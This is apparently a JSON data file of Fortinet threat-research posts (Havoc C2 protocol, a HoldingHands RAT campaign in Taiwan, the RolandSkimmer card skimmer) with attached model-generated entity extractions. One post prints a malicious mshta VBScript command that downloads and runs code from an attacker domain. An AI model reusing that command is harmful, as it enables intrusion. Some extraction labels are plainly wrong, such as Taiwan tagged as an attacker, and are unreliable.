Python, and Assembly (ASM). It was developed byC5piderand released in 2022. In Havoc, the Command and Control (C2) server is referred to as teamserver, while its UI dashboard, used to interact with teamserver, is referred to as the client. The Havoc agent, also known as a demon, runs on the compromised device to receive commands from the C2 server, allowing it to control the system. Figure 4 shows the Havoc client on the server side, where a demon is actively being connected and controlled. Havoc supports HTTP, HTTPS, and SMB protocols to transport commands and results between the C2 server and the compromised devices. In this sample, the C2 server is hardcoded as “apps[.]gist[.]githubapp[.]net.” Unfortunately, the server was unavailable during our analysis. To proceed with our analysis, we set up a simulated Command and Control (C2) server. We modified the protocol from HTTPS to HTTP, allowing the traffic to be captured and analyzed in plaintext without TLS encryption. As long as the Havoc demon is running on the compromised device, it collects metadata about both the compromised Windows system and the Havoc process itself. This metadata is encrypted using the AES algorithm and then sent to the C2 server to register the compromised system on the C2 server. As shown at the bottom of Figure 5, the collected metadata includes various system and process details. The metadata (size:0xBA) contains, but is not limited to, the following information: the agent ID (0x67C54600), Demon ID (0x0F), Host name, User name, Doman, IP address, process name (“C:\\Windows\\SYSTEM32\\cmd.exe”), process ID (0x1ED4), parent PID (0x2444), the process’s load base address, OS version information, OS architecture, and more. Figure 6 shows a demon-init packet containing the AES-encrypted metadata mentioned earlier. This packet must be sent as the first packet to the C2 server to register the victim’s system. We have divided the packet into color-coded sections and broken it down in the table below to explain the contents of each part. Offset Comments +00h The data size, 0xFA. +04h Magic value, 0xDEADBEEF. +08h Agent ID, 0x67C54600. +0Ch Command ID, 0x63. DEMON_INIT. +10h Request ID, 0x0. +14h AES Key, 20h bytes. +34h AES IV, 10h bytes. +44h The AES encrypted metadata. The demon-init packet is sent as the body of an HTTP POST request. When the C2 server receives the packet, it verifies the magic value and decrypts the metadata using the AES key and AES IV included in the packet to complete the registration process. Meanwhile, the demon appears on the client dashboard with the compromised system metadata, just as illustrated in Figure 4. Figure 7 shows a Wireshark screenshot capturing a demon-init packet sent via an HTTP Post request. Havoc defines a wide range of control commands to control the compromised system, listed below: COMMAND_GET_JOB(0x1) COMMAND_INLINEEXECUTE_EXCEPTION(0x1) COMMAND_INLINEEXECUTE_SYMBOL_NOT_FOUND(0x2) COMMAND_INLINEEXECUTE_RAN_OK(0x3) COMMAND_INLINEEXECUTE_COULD_NO_RUN(0x4) COMMAND_INLINEEXECUTE(0x14) COMMAND_NOJOB(0xA) COMMAND_SLEEP(0xB) COMMAND_PROC_LIST(0xC) COMMAND_FS(0xF) COMMAND_JOB(0x15) COMMAND_INJECT_DLL(0x16) COMMAND_INJECT_SHELLCODE(0x18) COMMAND_SPAWNDLL(0x1A) COMMAND_PROC_PPIDSPOOF(0x1B) CALLBACK_OUTPUT(0x0) CALLBACK_FILE(0x2) CALLBACK_FILE_WRITE(0x8) CALLBACK_FILE_CLOSE(0x9) CALLBACK_ERROR(0xD) CALLBACK_OUTPUT_OEM(0x1E) CALLBACK_OUTPUT_UTF8(0x20) DEMON_INIT(0x63) DEMON_INFO(0x59) BEACON_OUTPUT(0x5E) COMMAND_TOKEN(0x28) COMMAND_OUTPUT(0x5A) COMMAND_ERROR(0x5B) COMMAND_EXIT(0x5C) COMMAND_KILL_DATE(0x5D) COMMAND_CHECKIN(0x64) COMMAND_EXCEPTION(0x98) COMMAND_SYMBOL_NOT_FOUND(0x99) COMMAND_NET(0x834) COMMAND_CONFIG(0x9C4) COMMAND_SCREENSHOT(0x9CE) COMMAND_PIVOT(0x9D8) COMMAND_TRANSFER(0x9E2) COMMAND_SOCKET(0x9EC) COMMAND_KERBEROS(0x9F6) COMMAND_MEM_FILE(0xA00) COMMAND_PACKAGE_DROPPED(0xA0A) COMMAND_PROC(0x1010) COMMAND_PS_IMPORT(0x1011) COMMAND_ASSEMBLY_INLINE_EXECUTE(0x2001) COMMAND_ASSEMBLY_LIST_VERSIONS(0x2003) Most of the commands come with sub-commands to extend their capabilities. For example, theCOMMAND_FS(0xF)has 10 sub-commands: DEMON_COMMAND_FS_DIR(1) DEMON_COMMAND_FS_DOWNLOAD(2) DEMON_COMMAND_FS_UPLOAD(3) DEMON_COMMAND_FS_CD(4) DEMON_COMMAND_FS_REMOVE(5) DEMON_COMMAND_FS_MKDIR(6) DEMON_COMMAND_FS_COPY(7) DEMON_COMMAND_FS_MOVE(8) DEMON_COMMAND_FS_GET_PWD(9) DEMON_COMMAND_FS_CAT(10) Suppose the attacker needs to create a folder named “test” on the compromised system. The packet shown in Figure 8 can be observed: 0x0F is the command ID for DEMON_COMMAND_FS, and 0xA18D02EC is the request ID. The following value indicates the size of the encrypted sub-command and parameters. Within the decrypted sub-command data, 0x06 is the ID for DEMON_COMMAND_FS_MKDIR, and the subsequent data represents the folder name (size + data). In addition to the command and subcommand approach, Havoc also supports the in-memory execution of object files, commonly known as BOFs (Beacon Object Files). The C2 server sends a compiled Object File containing a piece of binary shellcode, which is executed directly in the memory of the demon process on the compromised system. Using BOFs allows Havoc to extend its functionality without replacing or updating the demon itself. Figure 8 shows a recently decrypted object file carried in a packet for the COMMAND_MEM_FILE command (command ID: 0xA00). The packet was sent when we typed “enum_filter_driver” in the client UI. In addition to the control commands, sub-commands, and BOFs introduced earlier, Havoc also implements a wide range of features. These features are categorized into two types: command and module, with each module containing multiple commands. Once we type a command name or a module name followed by its command name, the C2 server generates a command packet with the corresponding command ID and sub-command ID or BOF, which is then sent to the demon to control the compromised system. All the features of Havoc are listed in the table below. Command Name Type Description adcs_enum Command Enumerate CAs and templates in the AD. adcs_request Command Request an enrollment certificate. adduser Command Add a new user to a machine. addusertogroup Command Add a user to the specified group. arp Command Lists out ARP table. bofbelt Command A Seatbelt port using BOFs (Beacon Object Files). cacls Command List user permissions for the specified file. cat Command Display content of the specified file. cd Command Change to a specified directory. checkin Command Request a checkin request. config Module Configure the behavior of the demon session. cp Command Copy file. dcenum Command Enumerate domain information. dir Command List directory. dll Module DLL spawn and injection modules. domainenum Command Lists users accounts in the current domain. dotnet Module Execute and manage dotnet assemblies. download Command Downloads a specified file. driversigs Command Checks drivers for known EDR vendor names. enableuser Command Activates the specified user account. enum_filter_driver Command Enumerate filter drivers. enumlocalsessions Command Enumerate currently attached user sessions. env Command Print environment variables. exit Command Cleanup and exit. get-asrep Command Enumerate a given domain for user accounts with ASREP. get-delegation Command Enumerate a given domain for different types of abusable Kerberos Delegation settings. get-netsession Command Enumerate sessions on the remote device. get-spns Command Enumerate a given domain for user accounts with SPNs. get_password_policy Command Gets a server's configured password policy. help Command Shows help message of specified command. inline-execute Command Executes an object file. ipconfig Command Display network configuration settings . job Module Job manager. jump-exec Module Lateral movement module. kerberoast Command Perform Kerberoasting against specified SPN. klist Command List Kerberos tickets. ldapsearch Command Execute LDAP searches. listdns Command Obtains DNS cache entries. locale Command Prints the locale information of the server. luid Command Get current logon ID. mkdir Command Create new directory. mv Command Move a file or folder. nanodump Command Dump the LSASS process. nanodump_ppl_dump Command Bypass PPL and dump LSASS. nanodump_ppl_medic Command Bypass PPL and dump LSASS. nanodump_ssp Command Load a Security Support Provider (SSP) into LSASS. net Module Network and host enumeration module. netGroupList Command List groups. netGroupListMembers Command List group members. netLclGrpLstMmbrs Command List local group members. netLocalGroupList Command List local group. netshares Command List shared folders. netsharesAdmin Command List details of the shared folders. netstat Command List listening and connected network connections. netuptime Command Obtains the boot time information. netuser Command Get information about specific user. netview Command Lists the workstations and servers. noconsolation Command Execute a PE inline. nslookup Command Make a DNS query on the compromised device . pivot Module Pivoting module. powerpick Command Executes unmanaged powershell commands. powershell Command Executes powershell.exe commands. proc Module Process enumeration and management. ptt Command Import Kerberos ticket into a logon session. purge Command Purge a Kerberos ticket. pwd Command Get current directory. quser Command Simple implementation of quser.exe. reg_delete Command Deletes the registry key or value. reg_query Command Query a registry value or enumerate a single key. reg_query_recursive Command Recursively enumerate a key. reg_save Command Saves the registry path and all subkeys to a file. reg_set Command Creates or sets the specified key or value. remove Command Remove file or directory. resources Command List information of memory and disk drive. routeprint Command Prints route information. rportfwd Module Reverse port forwarding. samdump Command Dumps the SAM, SECURITY and SYSTEM registries to files. sc_create Command Creates a service on the target device. sc_delete Command Deletes the specified service. sc_description Command Sets the description of an existing service. sc_enum Command Enumerate services. sc_qc Command Queries a service with name in BOF (Beacon Object Files). sc_qdescription Command Queries a services description sc_qfailure Command Query a service for failure conditions. sc_qtriggerinfo Command Query a service for trigger conditions. sc_query Command Query services in BOF (Beacon Object Files). sc_start Command Starts a specified service. sc_stop Command Stops a specified service. schtasksenum Command Enumerate scheduled tasks. schtasksquery Command Query the given task in scheduled tasks. screenshot Command Takes a screenshot. sessions Command Get logon sessions. setuserpass Command Sets the password to a specified user account. shell Command Executes Windows commands in cmd.exe. shellcode Module Shellcode injection techniques. sleep Command Sets the delay to sleep. socks Module Manages socks5 proxy. task Module Task manager. tasklist Command List running processes on the remote device. tgtdeleg Command Retrieve a usable TGT for the current user. token Module Token manipulation and impersonation. transfer Command Download transfer module. upload Command Uploads a file. uptime Command Lists system boot time. userenum Command Lists user accounts. whoami Command Get the login user information in BOF (Beacon Object Files). windowlist Command List visible windows, like program windows’ title. wmi_query Command Run a wmi query and display results in CSV format. Here is how a control command is packaged into a packet. Acting as an attacker, we entered the “pwd” command inside the Havoc C2 server and sent it to the demon, which then displayed the command result on our screen. Typically, once the demon has connected to the C2 server, it sends a heartbeat packet to the C2 server approximately every 3 seconds (a random number) to notify the C2 server that the demon is still alive. The heartbeat packet structure is shown in Figure 10. Figure 10 also shows the command packet for the “pwd” command generated by the C2 server at the bottom. The control command data is sent within the response to the heartbeat packet. The command packet begins with a command ID (0x0F for COMMAND_FS), followed by a request ID (0xc5312b04), the size of the encrypted data, and then the encrypted data itself. The encrypted data, “51 7c 66 9c,” decrypts to “00 00 00 09,” which is the sub-command ID 0x9 (for DEMON_COMMAND_FS_GET_PWD) under the command ID 0x0F (COMMAND_FS). This analysis provides a detailed examination of a Havoc variant involved in a long-term cyber intrusion targeting critical national infrastructure in the Middle East. It demonstrates how this remote injector leverages a disguised conhost.exe process to deploy the Havoc payload into a newly created cmd.exe process. The Havoc framework’s modular design, supporting commands, sub-commands, and in-memory execution of Beacon Object Files (BOFs), offers attackers a flexible method to control the remote demon process. Overall, understanding the packet structures, encryption mechanisms, and command execution workflows will help researchers detect and analyze this sophisticated RAT framework. Fortinet customers are already protected from this malware with AntiVirus service, FortiGuard’s Anti-Botnet service, FortiGuard’s AntiSPAM service, and FortiGuard’s Web Filtering service as follows: TheFortiGuard’s Anti-Botnet serviceblocks the DNS requests for the C2 server domain. The domain to the C2 server is rated as “Malicious Websites” by theFortiGuard Web Filtering service. FortiGuard Antivirus servicedetects the remote injector and the encrypted Havoc DLL file with the following AV signatures. W64/Havoc.d16b!trData/Havoc.e5b0!tr FortiGuard IPS servicedetects Havoc traffic with the signature “Backdoor.Havoc.Agent”. FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. We also suggest that our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end-users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. apps[.]gist[.]githubapp[.]net [conhost.exe / the remote injector]22BD09FBAB54963D4B0234585D33571A47A2DF569DBAB8B40988415AB0A3C37B[conhost.dll / encrypted Havoc sample with shellcode]9208034AF160357C99B45564FF54570B1510BAF3BC033999AE4281482617FF5B FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Okay, let's tackle this input. First, I need to identify all the entities of the specified types and then find the relationships between them.\n\nStarting with the text: FortiGuard Labs Threat Research is mentioned, but that's an organization, not one of the entity types. The main entities here are the malware, threat types, attackers, techniques, tools, vulnerabilities, IPs, domains, URLs, files, and hashes.\n\nLooking for Malware: The text mentions \"Havoc variant samples\" and \"Havoc\" is a backdoor framework. So \"Havoc\" is a Malware. Also, \"conhost.exe\" is a file, but it's part of the system, maybe not malicious. Wait, the text says \"remote injector (conhost.exe) is launched by the system Task Scheduler\". But conhost.exe is a legitimate Windows process, so maybe not a malware. However, the text says \"malicious Havoc variant samples\", so Havoc is the malware. Also, \"Task Scheduler\" is a tool or a system component, but not sure if it's an entity here. The text mentions \"added several pieces of malware to the system’s Task Scheduler to maintain persistence.\" So the malware is added to Task Scheduler, but Task Scheduler is a system tool, not a malicious one. So maybe \"Havoc\" is the main malware here.\n\nThreat Type: The text mentions \"Intrusion into Middle East Critical National Infrastructure",
      "entities": [],
      "relationships": [],
      "has_entities": false
    },
    "entity_count": 0,
    "relationship_count": 0,
    "model": "Qwen3 4B",
    "index": 9
  },
  {
    "title": "Threat Group Targets Companies in Taiwan",
    "link": "https://www.fortinet.com/blog/threat-research/threat-group-targets-companies-in-taiwan",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attacksSeverity Level:High In January 2025, FortiGuard Labs observed an attack targeting users in Taiwan. The threat actor is spreading the malware known as winos 4.0 via an email masquerading as being from Taiwan's National Taxation Bureau. Through continued monitoring, we identified further malware samples associated with this campaign. Among the new samples, a phishing email was sent in March 2025 with an attachment that contained a link used in another attack campaign. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The first link belongs to the domain twszz[.]xin, which follows a similar naming pattern to the campaign targeting users in Taiwan. The second link directs to an image file about tax inspection, while the HTML filename claims to include account statement details. This link enabled us to trace the attack and identify additional malware samples, along with further links. Figure 2 provides a simplified threat map. The files on the left side of Figure 2 are XLS files used in campaigns that took place in June 2024. Over the past few months, this threat group has deployed malware based on the HoldingHands RAT (Remote Access Trojan), also known as Gh0stBins, to compromise users in Taiwan. The malware typically comprises multiple files embedded within a ZIP file and is distributed via phishing emails. Phishing emails typically masquerade as messages from the government or business partners, using topics such as taxes, pensions, invoices, and other subjects that prompt the recipient to immediately click on or open an attachment. Sometimes, the email content can be a picture with a hyperlink that asks the recipient to click on it, inadvertently downloading the malware. The attached PDF file uses content related to the phishing email to trick the recipient into opening the link. In newer attack chains, the link leads to a download page. The malware download page looks much simpler than the PDF file and email. It only contains text and a download button. In some attack chains, the malware is embedded in a password-protected ZIP file, and the password is on the download page. This prevents analysts who get the ZIP file but don't have access to the download page from opening it. Multiple files are used during the attack, including legitimate executable files and necessary DLL files, encrypted shellcode, and shellcode loaders. The shellcode loaders, which decrypt and execute the encrypted shellcode, are DLL files loaded by a legitimate executable via side-loading. Figure 8 shows an example of the files embedded in the ZIP file and the execution flow.條例檔案is the legitimate executable file used to loaddokan2.dllvia side-loading. In addition to the main execution flow, encrypted shellcodes support persistence, and empty files provide unique filenames. Although the ZIP files downloaded from different PDF files and webpages may have varying folder structures and files, their execution flows are similar to those shown in Figure 8. Sometimes, the ZIP file only contains an executable that drops the duplicate files observed in other chains. According to the image debug directory of the executable file, the malware is based on the HoldingHands Remote Access Trojan (RAT). Over the past two months, the ZIP file has included a text file containing the passwords for other files in the ZIP file, which makes detection more difficult. Dokan2.dll creates a thread to decrypt data indxpi.txtand execute it. Before this, it calls theShowWindowfunction to hide the executable's window for side-loading. It then searches forkernel32.dllandDwhsOqnbdrr.dllby comparing the lengths of the filenames of the files extracted from the ZIP file. DwhsOqnbdrr.dllis an empty file. By shifting each letter in the filename “DwhsOqnbdrr”forward one position in the alphabet, it becomesExitProcessand loads the function from thekernel32.dllit just found. It replaces the address of theExitProcessfunction in the import table with the address of a function that calls theWaitForSingleObjectfunction to wait for a signal from the thread that decryptsdxpi.txt. When the thread finishes, it calls theExitProcessfunction that it just loaded. In the thread, it executesthe條例檔案as an administrator if it doesn’t have high enough privileges. Then it searches forcollalautriv.xmland converts the filename to getVirtualAlloc, the API used in decryption. dxpi.txtexecutes initial setups for the next stage, including anti-VM, privilege escalation, and installation. Subkey: SOFTWARE\\MsUpTas Value name: State Value: 1 In addition, it drops other files extracted from the ZIP file to C:\\Program Files (x86)\\WindowsPowerShell\\Update. Original filename After Filename of dropped file Description bkproc.dll TaskServer.exe The same file as the條例檔案. code.dll code.bin It’s copied as System32\\msvchost.dat. Db.dll msgDb.dat The malicious payload. Shellcode based on HoldingHands. Doport.dll dokan2.dll Shellcode loader formsgDb.dat. EGLProtect.dll libEGL.dll The legitimate DLL file for條例檔案. fig32.dll config32.bin Unused. It renames the legitimateversion.dllasconfVersion.dlland writes the decrypted data ofconfig32.binto SysWOW64\\version.dllif it’s used. fig64.dll config64.bin It renames the legitimateTimeBrokerClient.dllasBrokerClientCallback.dlland writes the decrypted data ofconfig64.bintoTimeBrokerClient.dll. simg32.dll simg64.dll Binary file that is used bymsvchost.dat. In addition, it terminates ifBrokerClientCallback.dllandBlend.dllare present, indicating that the computer is infected.Blend.dllis thelegitimatemsimg32.dllthat is later renamed bymsvchost.dat. After installation, it executesTaskServer.exe, which loadsdokan2.dllvia side-loading. Dokan2.dllthendecrypts and executes the shellcode inmsgDb.datfor the next stage. Original Filename Filename of dropped file Description msgDb.dat system.dat, mymsc.nls The malicious payload. dokan2.dll dokan2.dll Shellcode loader formsgDb.dat. libEGL.dll libEGL.dll The legitimate DLL file for條例檔案. TaskServer.exe taskyhost.exe The same file as the條例檔案. simg64.dll msimg32.dll Shellcode loader forsystem.dat. MsgDb.datimplements C2 tasks for setting registry keys, data collection, and module download from the HoldingHands RAT. It also sends heartbeat packets to ensure the connection is active. Below is the packet's data structure, excluding the header. The packets frommsgDb.datand the C2 server follow this structure. 0 1 2 3 4 5 6 7 8 9 A B C D E F 0 Magic Data size Unused Command 1 Payload(optional) ⁞ ⁞ Magic: 0xDEADBEEFData size: The size of the command and the payload The first outgoing packet doesn’t contain a payload. TheKNELcommand indicates that the packet is from a kernel module. As a response, the C2 server sends a data collection request. After sending the user information,msgDb.datsends heartbeat packets and waits for further instructions. The response command is 0x00. To get the install date, it reads theInstallDatevalue from the SOFTWARE\\HHClient registry key. If this is the first time the C2 server queries for this information, it writes the current time to the value. The registry values set by other commands areCommentandGroupfrom the SOFTWARE\\HHClient registry key. If theCommentvalue is not set, it writesdefaultto the packet. Once all data is downloaded,msgDb.datexecutes the module. Otherwise, it sends 0x0B to ask for more data. During our analysis, we identified three modules delivered by the C2 server, including two remote desktop modules and a file manager.msgDb.datcalls the only export function, ModuleEntry, to proceed to the next stage of the attack. Below are the commands in the initial packet: Module name Command Description rd RDTP Remote desktop rd_dxgi RDTP Remote desktop filemgr FMGR File manager The packets follow the same structure asmsgDb.dat. The modules' image debug directories indicate that they also belong to the HoldingHands RAT. Some modules appear to be simplified versions, as indicated by the term 'jingjianban' (meaning 'lite version' in Chinese) in the Image Debug Directory. In addition towinos, which we covered in February 2025, and HoldingHands, discussed in this article, this threat group frequently employs Gh0stCringe. Figures 5 through 7 include screenshots of files in this attack chain. This analysis revealed further malware samples associated with the attack that began targeting Taiwan in January 2025. The attack chain comprises numerous snippets of shellcode and loaders, making the attack flow complex. However, the purpose of these samples is to execute a malicious payload that accesses a C2 server to receive further instructions. Across winos, HoldingHands, and Gh0stCring, this threat group continuously evolves its malware and distribution strategies. FortiGuard will continue to monitor these attack campaigns and provide appropriate protections as required. The malware described in this report is detected and blocked byFortiGuard Antivirusas: PDF/Agent.A6DC!tr.dldrW64/ShellcodeRunner.ARG!trW64/Agent.FIN!trW64/HHAgent.BEE8!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have installed the latest updates for these products are protected. The FortiGuard CDR (Content Disarm and Reconstruction) service, which runs on both FortiGate and FortiMail, can disarm malicious macros in documents. We also suggest that organizations go through Fortinet’s freeNSE trainingmodule:FCF Fortinet Certified Fundamentals. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. 154[.]91[.]85[.]204154[.]86[.]22[.]47156[.]251[.]17[.]17206[.]238[.]179[.]173206[.]238[.]220[.]60206[.]238[.]199[.]22154[.]91[.]85[.]201206[.]238[.]221[.]182206[.]238[.]196[.]32154[.]91[.]64[.]45206[.]238[.]115[.]207156[.]251[.]17[.]12107[.]149[.]253[.]183 00-1321729461[.]cos[.]ap-guangzhou[.]myqcloud[.]com6-1321729461[.]cos[.]ap-guangzhou[.]myqcloud[.]comtwzfte-1340224852[.]cos[.]ap-guangzhou[.]myqcloud[.]comcq1tw[.]toptwcz[.]protwczb[.]comtwnc[.]inktwnic[.]icutwnic[.]inktwnic[.]ltdtwnic[.]xintwsa[.]toptwsw[.]cctwsw[.]clubtwsw[.]infotwsw[.]inktwsw[.]ltdtwsw[.]protwsww[.]viptwsww[.]xintwswz[.]toptwswzz[.]xintwtgtw[.]nettwzfw[.]vip 6558dfb070421c674b377a0a6090593fa0c44d5b0dec5325a648583f92175ce2d3a270d782e62574983b28bd35076b569a0b65236e7f841a63b0558f2e3a231ca8430ce490d5c5fab1521f3297e2d277ee7e7c49e7357c208878f7fd5f7639317d3f352ded285118e916336da6e6182778a54dc88d4fb7353136f028ac9b81e0143f434e3a2cac478fb672b77d6c04cdf25287d234a52ee157f4f1a2b06f8022c25e80cd10e7741b5f3e0b246822e0af5237026d5227842f6cf4907daa0398487263550339c2a35f356bb874fb3a619b76f2d602064beada75049e7c2927a6dc a8b6c06daeede6199e69f4cafd79299219def5bf913a31829dede98a8ad2aaa96fcd6aef0678d3c6d5f8c2cb660356b25f68c73e7ee24fbb721216a547d17ffaed72721837c991621639b4e86ffe0c2693ef1a545741b5513d204a1e3e008d8c65edd9e1a38fd3da79c8a556eb2c7c595125ffec9f7483e2e6e189a08cc5d4120a0375648bc9368bccfd3d657d26976d5b1f975381d1858d001404d807334058e809582faccdd27337aa46b4a11dd11f5d0c7d7428ebdc8c895ea80777e4da5f59d2433264d8ec9e9797918be3aa7132dbeb71e141f6e5c64c0d6f1cb4452934 ac957ba4796f06c4bf0c0afb8674bbeb30eb95cef85bc68ced3ee1aa30e3acff9296adb71bc98140a59b19f68476d45dbb38cc60b9e263d07d14e7178f195989636c2ccffce7d4591b0d5708469070b839f221400b38189c734004641929ae0531ffa4e3638c9e094275051629cc3ac0a8c7d6ae8415bbfcacc4c605c7f0df39da3deea591b59b1a0f7e11db2f729a263439a05f3e8b0de97bbac99154297cea e2269b38655a4d75078362856c16594e195cd647c56b8c55883b8e1286baa65852632d9e24f42c4651cf8db3abc37845e693818d64ab0b11c235eddf8e011b2f7200155f3e30dbbd4c4c26ce2c7bd4878ab992b619d80b43c0bd9e17390082fce516b102a2a6001eafb055e42feb9000691e2353c7e87e34ddaa99d7d8af16fda9ddd4e4d54336ce110fdc769ff7c4940f8d89b45ee8dc24f56fc3ea00c18873a12d17cca038cdbf79b72356e5d20b17722c7b20bd2ee308601bac901890f3f4b1ac2178c90c8eafd8121d21acbae7a0eb0cbc156d4a5f692f44b28856a23481a6c1629b4450f713b02d24f088c4f26b0416c6a7924dcf0477425f3a67a2e3ff3ce81c163ddedb132116cdf92aae197ced0b94f3fc3d1036f5c41b084a256a03a19fdfc131e8fbe063289c83a3cdefb9fb9fb6f1f92c83b892d3519a381623dbdb15f45f69f863510986fb2198a8a6b3d55d8ccc8a2ed4bb30bc27bdd1bf151cbf1a7938f61a9905e1b151c7a5f925a2ce3870b7c3e80f6e0fc07715bdc258b7f42c6949c6d8ecf648bacca08cde568f11ec2663221a97dae5fbf01218e8775a FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (Microsoft Windows, Vulnerability), (Microsoft Windows, Impact), (FortiGuard Labs, Threat Type), (Taiwan, Attacker), (winos 4.0, Malware), (phishing, Technique), (twszz[.]xin, Domain), (image file about tax inspection, File), (account statement details, File), (XLS files, File), (HoldingHands RAT, Malware), (Gh0stBins, Malware), (Figure 2, File)\nRelationships: (FortiGuard Labs, observed, Taiwan), (FortiGuard Labs, observed, winos 4.0), (winos 4.0, uses, phishing), (twszz[.]xin, linked to, twszz[.]xin), (image file about tax inspection, linked to, account statement details), (XLS files, used in, June 2024), (HoldingHands RAT, aka, Gh0stBins), (HoldingHands RAT, deploy, users in Taiwan)\n```\n\nOkay, let's tackle this. The user provided a text and wants me to identify entities and relationships based on the given types. First, I need to go through the text carefully.\n\nStarting with the first sentence: \"FortiGuard Labs Threat Research Affected Platforms: Microsoft Windows\". Here, \"Microsoft Windows\" is mentioned as an affected platform. But the entity types include Vulnerability",
      "entities": [
        [
          "Microsoft Windows",
          "Vulnerability"
        ],
        [
          "Microsoft Windows",
          "Impact"
        ],
        [
          "FortiGuard Labs",
          "Threat Type"
        ],
        [
          "Taiwan",
          "Attacker"
        ],
        [
          "winos 4.0",
          "Malware"
        ],
        [
          "phishing",
          "Technique"
        ],
        [
          "twszz[.]xin",
          "Domain"
        ],
        [
          "image file about tax inspection",
          "File"
        ],
        [
          "account statement details",
          "File"
        ],
        [
          "XLS files",
          "File"
        ],
        [
          "HoldingHands RAT",
          "Malware"
        ],
        [
          "Gh0stBins",
          "Malware"
        ],
        [
          "Figure 2",
          "File"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs",
          "observed",
          "Taiwan"
        ],
        [
          "FortiGuard Labs",
          "observed",
          "winos 4.0"
        ],
        [
          "winos 4.0",
          "uses",
          "phishing"
        ],
        [
          "twszz[.]xin",
          "linked to",
          "twszz[.]xin"
        ],
        [
          "image file about tax inspection",
          "linked to",
          "account statement details"
        ],
        [
          "XLS files",
          "used in",
          "June 2024"
        ],
        [
          "HoldingHands RAT",
          "aka",
          "Gh0stBins"
        ],
        [
          "HoldingHands RAT",
          "deploy",
          "users in Taiwan"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 13,
    "relationship_count": 8,
    "model": "Qwen3 4B",
    "index": 10
  },
  {
    "title": "RolandSkimmer: Silent Credit Card Thief Uncovered",
    "link": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered",
    "content": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:Collects victim’s sensitive informationSeverity Level:High Web-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection. The attacker first spreads a malicious ZIP file named “faktura_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura_1065170.lnk.” This shortcut covertly executes the following hidden command: C:\\WiNDOws\\SYsTEM32\\MShTA.exe vbscript:execute(\"SeT mi1=CReATeobjECt(\\\"msxmL2.SErverXMlHTtp.6.0\\\"):mi1.OpEN \\\"geT\\\",\\\"Hxxp://iNVsetmX[.]cOM/ipa.AsPX\\\",faLSe:mi1.SEnD():rANdOMize:R=INt(rnD*99999):ExECute(REpLAce(mI1.REsponSEtEXt,\\\"#\\\", R)):\")(wiNDoW.ClosE) The page “ipa.AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands. Below is a network traffic example showing both the regular communication and the encoded commands received from the server. The encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts. First, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path. It then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments. To target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.” The following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities. The attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites. The extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions: This combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception. The background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code. To generate the identifier, a value called key2 is created based on the current timestamp, including the date, 